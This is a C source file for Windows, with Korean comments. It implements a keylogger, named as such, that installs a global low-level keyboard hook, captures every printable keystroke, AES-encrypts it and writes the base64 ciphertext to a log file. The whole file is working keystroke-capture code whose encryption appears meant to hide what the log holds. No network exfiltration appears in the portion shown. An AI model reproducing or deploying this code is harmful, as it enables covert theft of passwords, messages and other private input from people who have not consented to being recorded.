#include <windows.h>
#include <stdlib.h>
#include "../include/input_encrypt.h"
#include "../include/crypto.h"
#include "../include/logger.h"

char *base64_encode(const unsigned char *data, size_t len);

static HHOOK hKeyHook = NULL;

// 키코드 → 문자 변환
static char vk_to_char(KBDLLHOOKSTRUCT *kbStruct)
{
    BYTE keyboard_state[256];
    GetKeyboardState(keyboard_state);

    char buffer[2] = {0};
    UINT scanCode = MapVirtualKey(kbStruct->vkCode, MAPVK_VK_TO_VSC);
    ToAscii(kbStruct->vkCode, scanCode, keyboard_state, (LPWORD)buffer, 0);
    return buffer[0];
}

// 키 입력 훅 콜백
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN)
    {
        KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
        char ch = vk_to_char(p);
        if (ch >= 32 && ch <= 126)
        {
            unsigned char *cipher;
            int clen = aes_encrypt((unsigned char *)&ch, 1, &cipher);
            if (clen > 0)
            {
                char *b64 = base64_encode(cipher, clen);
                write_logf("[AES] %s", b64);
                free(cipher);
                free(b64);
            }
            else
            {
                write_log("[ERROR] AES 암호화 실패.");
            }
        }
    }
    return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

void initialize_encrypted_keylogger(void)
{
    hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    write_log(hKeyHook ? "[INFO] AES 키보드 훅 설치 완료."
                       : "[ERROR] AES 키보드 훅 설치 실패.");
}